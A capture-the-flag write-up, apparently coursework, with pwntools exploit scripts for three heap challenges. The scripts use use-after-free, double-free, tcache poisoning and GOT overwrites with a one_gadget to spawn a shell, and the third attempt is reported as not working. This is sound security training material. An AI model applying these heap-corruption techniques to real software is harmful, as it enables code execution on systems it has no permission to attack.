usemedontabuseme
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIyMDMuMjE5LjE0MS4xNTkiLCJzZXNzaW9uIjoiNWZiMjNjNWItNGIxMy00YjQyLTg5YTAtMDMxNmFhMzc4ZDA5In0.3aG1X8VgWLcnP4cMEbZVPaM5pik4wRxjExckya7Ldus}

General overview of problems faced
-------------------------------------
# For this challenge, through playing around with the program I realised that if I 
# view the contents of a clone after it has been freed, you can get unexpected results.
# Hence, if I create and free two clones, and then view the contents of the second,
# the last four bytes of output will be a memory leak.

# If we open the binary in gdb and use the command 'vis_heap'chunks', I noticed this
# leaked address was actually the address of the first tcachebin. Also, looking at
# this chunk we can see exactly 0x8 + 0x4 = 0xc bytes after our leaked address is the
# address for the hint function used by the program.

# So, we can do a use after free on clone 0 to change the value stored in this 
# chunk to be the hint address. Then, we make two clones which can store any value, 
# and then a third clone whose value is the address of the win function. 

# Doing so will mean that if we access the hint function for clone 3, we will instead
# jump to the win function, which pops a shell as required.

Script/Command used
------------------
```
PROGNAME = "challenges/./usemedontabuseme"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7000

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf
 
def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ",timeout=0.1)
    result = p.recvline()
    menu()
    return result

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    return p.recvline()

# To get our heap address leak, we create and free two clones before viewing the 
# contents of the second one. The address is then the first 4 bytes of output.
make(0, b"AAAA")
make(1, b"BBBB")
kill(0)
kill(1)
addr = view(1)[:4]

# Now we have the leak for tcachebins, we add 0xc to get the stored address of the
# hint function. We then set the value of the already freed first clone to be this.
edit(0, p32(u32(addr) + 0xc))

# Next, we create two clones with any value, and a third clone whose value is the
# address of the win function, which will overwrite the hint function.
make(2, b"")
make(3, b"")
make(4, p32(elf.symbols["win"]))

# Finally, if we call the hint function on this clone, it will instead jump to the win
# function.
hint(3)

# Now we have a shell and can access the flag.
p.interactive()
```
``

ezpz1
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMjAzLjIxOS4xNDEuMTU5Iiwic2Vzc2lvbiI6ImM4MDQzYjEyLTg2OGQtNDQ2Yi1iNWIyLWNiM2NlNDgyZWM0ZSJ9.O_iCw_Z_1NqorNT2oZsq8ZRrLbUJOv21Fxw6XmF5xrE}

General overview of problems faced
-------------------------------------
# To start this challenge, I was simply playing around with the binary to find a
# potential use after free or double free exploit. When doing so, I discovered that if
# I created a clone, deleted this clone, and then tried to view the contents of this
# clone, it gave a segmentation fault.

# When debugging this in gdb, I found this happens as it tries to jump to address 
# '0x00'. So, my plan was to attempt to overwrite this address with a more useful
# address. Looking in binary ninja, the binary contains a win function, so I will want
# to jump to this.

# Hence, solving this challenge becomes quite simple, as I simply have to create and
# delete a clone, and then create a second clone which I will set the value of to
# be the win function's address. Then, when I attempt to view the contents of a clone,
# it will jump to this address and pop a shell.

Script/Command used
------------------
```
PROGNAME = "challenges/./ezpz1"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7001

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def menu():
    p.recvuntil("refresh): ")

def create():
    p.sendline("c")
    p.recvuntil("Created new question. ",timeout=0.1)
    index = p.recvline()[-2:-1]
    log.info("Create: {}".format(int(index)))
    menu()
    return index

def delete(index):
    log.info("Delete: {}".format(int(index)))
    p.sendline("d")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    menu()

def setQ(index, name):
    log.info("Set: {} to {}".format(int(index), str(name)))
    p.sendline("s")
    p.recvuntil("question id: ")
    p.sendline(index)
    p.recvuntil("your question: ")
    p.sendline(name)
    menu()

def ask(index):
    log.info("Ask: {}".format(index))
    p.sendline("a")
    p.recvuntil("question id: ")
    p.sendline(str(index))

# First we create and delete a clone.
create()
delete(0)

# Now we create another clone, and set its value to be the address of the win function.
create()
setQ("1", p32(elf.symbols["win"]))

# Now we simply need to view the contents of a clone, which will instead jump to the
# win function.
ask(b"")

# Given we have popped a shell, we can now access the flag.
p.interactive()
```
``

ezpz2
===========================
Flag: N/A

General overview of problems faced
-------------------------------------
# To begin, I discovered a double free vulnerability in the program, such that if
# I did the following:
# create()
# delete(0)
# delete(0)
# result = ask(0)
# then result would store an address such as 0x8526170.

# By connecting the binary to gdb and using 'vis_heap_chunks', we can see this is the
# address of the first tcachebin. Also, if we use command 'bins' in gdb we can see
# tcahcebins contains a loop of pointers. Hence, I thought I could approach this in
# a similar way to earlier challenges and overwrite an address on the heap with
# another value.

# However, looking in binary ninja I discovered there wasn't a win function, and there
# weren't any other functions within the binary I would want to jump to.

# So, I realised I am probably going to have to overwrite an entry in the GOT table
# with a one gadget. To do this, we can use the command 'one_gadget /path/to/libc' in 
# the terminal to see all available one gadgets in a given version of libc. In gdb, we 
# can use 'vmmap' to see the path to libc is '/lib/i386-linux-gnu/libc-2.27.so', so we 
# can use this in our one_gadget command.

# From this, we are given various one gadgets. For one to work, we need to ensure the
# given constraints on certain registers are true, and we need to know the libc base 
# address such that we can add the given offset to it to get the gadget's address.

# So, I now need to determine a way to leak a libc address, and from that I can 
# determine the base of libc. To do so, I created and freed several clones, and then
# for the third clone modified the value stored to be the GOT address for printf
# repeated several times. If I then viewed the contents of clone 3, it would now 
# display the libc address of printf.

# Given this libc leak, we can now use command:
# readelf -s /lib/i386-linux-gnu/libc-2.27.so | grep ' printf'
# to see the offset of printf in the libc being used. If we then subtract this offset
# from our leak, we now have the base of libc.

# NOTE: For remote, I would need to use a libc-database to figure out the version of
# libc being used and recalculate the libc base accordingly.

# With the address of libc's base, we can now determine the address of our one gadget
# using its offset, and we now want to overwrite this GOT entry for printf with the
# address of our one gadget. We can do this by setting the value of one of our clones
# to be this address, and then when printf is called again it should pop a shell.

# However, I was unable to get this to achieve my goal. This may be due to the
# constraints for my one gadget not being met, or most likely due to a mistake or
# incorrect assumption I have made during my attempt.

Script/Command used
------------------
```
PROGNAME = "challenges/./ezpz2"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def menu():
    p.recvuntil("refresh): ")

def create():
    p.sendline("c")
    p.recvuntil("Created new question. ",timeout=0.1)
    index = p.recvline()[-2:-1]
    log.info("Create: {}".format(int(index)))
    menu()
    return index

def delete(index):
    log.info("Delete: {}".format(int(index)))
    p.sendline("d")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    menu()

def setQ(index, name):
    log.info("Set: {} to {}".format(int(index), str(name)))
    p.sendline("s")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    p.recvuntil("your question: ")
    p.sendline(name)
    menu()

def ask(index):
    log.info("Ask: {}".format(int(index)))
    p.sendline("a")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    p.recvuntil("perhaps: ",timeout=0.1)
    result = p.recvline()[1:-2]
    menu()
    return result

# To begin, we create and delete various clones to setup the heap linked list how
# we need it before filling it with the GOT address of printf.
create()
create()
delete(0)
delete(1)
create()
create()

# Now we can set the value of clone 3 to be filled with the GOT address of printf.
# Here I use the ELF file, but we can also see in binary ninja the address of 
# printf@GOT is 0x804b010.
setQ(3, p32(elf.got["printf"]) * 15)

# Now we want to view the contents of clone 2, with the last 4 bytes of this ouput
# being the libc address of printf.
printfLeak = u32(ask(2)[:4])

# By searching in the ELF file, we can determine the printf offset in the libc being
# used, and we subtract this from the leak.
libcBase = printfLeak - 0x000513a0

# We now create and delete additional clones to prepare for our next write.
create()
delete(4)

# This is where we overwrite the GOT entry for printf with our one gadget which will
# pop a shell. We get this gadget's address by simply adding the offset given by the
# one_gadget command to the libc base.
gadget = libcBase + 0x3d123
setQ(4, p32(gadget))

# We then create a new clone, which should trigger our one gadget and pop a shell.
create()

# Given we now have shell, we can access the flag.
p.interactive()
```
``